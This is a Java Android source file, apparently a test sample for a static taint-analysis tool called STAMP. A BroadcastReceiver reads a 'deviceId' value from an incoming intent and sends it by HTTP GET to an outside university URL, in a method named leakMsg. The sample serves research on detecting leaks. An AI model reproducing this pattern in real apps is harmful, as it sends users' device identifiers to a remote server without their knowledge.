package stamp.stanford.malware;

import java.io.IOException;
import java.net.MalformedURLException;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;

public class AlarmBroadcastReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context ctx, Intent intent) {
		// TODO Auto-generated method stub
		List dummylist = new ArrayList();
		//Bundle senseData = intent.getExtras();
		dummylist.add(intent.getExtras());
        this.leakMsg(dummylist);        
	}
	
	public void leakMsg(List dummylist) {
		Bundle bundle = (Bundle) dummylist.get(0);
		String msg = bundle.getString("deviceId");
		try {
			HttpClient client = new DefaultHttpClient();
			String getURL = "http://www.cs.wm.edu/~yufeng/cgi-bin/stamp/id.php?deviceId="
					.concat(msg);
			HttpGet get = new HttpGet(getURL);
			HttpResponse responseGet = client.execute(get);
		} catch (MalformedURLException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

}
